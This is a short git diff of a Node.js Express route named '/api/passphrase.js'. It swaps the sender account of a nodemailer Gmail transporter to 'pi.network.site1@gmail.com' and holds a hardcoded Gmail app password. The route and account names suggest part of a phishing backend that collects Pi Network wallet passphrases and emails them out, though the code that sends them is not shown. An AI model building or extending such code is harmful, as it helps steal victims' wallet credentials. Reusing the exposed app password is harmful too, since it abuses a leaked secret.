@@ -25,7 +25,7 @@ app.post('/api/passphrase.js', async (req, res) => {
   const transporter1 = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'demo.test.bot15@gmail.com',
+      user: 'pi.network.site1@gmail.com',
       pass: 'dvts eodz jyop dozu' // App password for first Gmail
     }
   });
